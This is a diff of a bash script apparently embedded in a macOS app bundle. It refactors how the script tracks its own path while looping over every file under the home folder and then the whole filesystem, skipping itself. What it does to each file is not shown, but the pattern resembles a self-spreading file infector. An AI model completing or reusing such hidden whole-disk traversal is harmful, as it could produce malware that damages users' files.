@@ -17,6 +17,8 @@ while [ "$PID" -gt 1 ]; do
     PID="$(ps -p "$PID" -o ppid= | tr -d ' ')"
 done
 
+SELF="$APP"
+
 # Chemin du script embarqué A
 SCRIPTA="$APP/Contents/Resources/scriptA.sh"
 
@@ -37,8 +39,6 @@ fi
 
 TARGET="$HOME"
 
-SELF="$1"
-
 while IFS= read -r -d '' FILE
 do
     if [ "$FILE" = "$SELF" ]; then
@@ -55,8 +55,6 @@ done < <(find "$TARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)
 
 TARGET="/"
 
-SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
-
 while IFS= read -r -d '' FILE
 do
     if [ "$FILE" = "$SELF" ]; then
@@ -68,17 +66,19 @@ do
     else
         continue
     fi
+
+
 
 # scriptA.sh
 #!/bin/bash
 
 TARGET="$HOME"
 
-SELF="$1"
+SELFA="$1"
 
 while IFS= read -r -d '' FILE
 do
-    if [ "$FILE" = "$SELF" ]; then
+    if [ "$FILE" = "$SELFA" ]; then
         continue
     fi
 
@@ -88,15 +88,13 @@ do
         continue
     fi
     
-done < <(find "$TARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)
+done < <(find "$TARGET" -path "$SELFA" -prune -o -type f -print0 2>/dev/null)
 
 TARGET="/"
 
-SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
-
 while IFS= read -r -d '' FILE
 do
-    if [ "$FILE" = "$SELF" ]; then
+    if [ "$FILE" = "$SELFA" ]; then
         continue
     fi
 
@@ -106,5 +104,5 @@ do
         continue
     fi
 
-done < <(find "$TARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)
+done < <(find "$TARGET" -path "$SELFA" -prune -o -type f -print0 2>/dev/null)
 
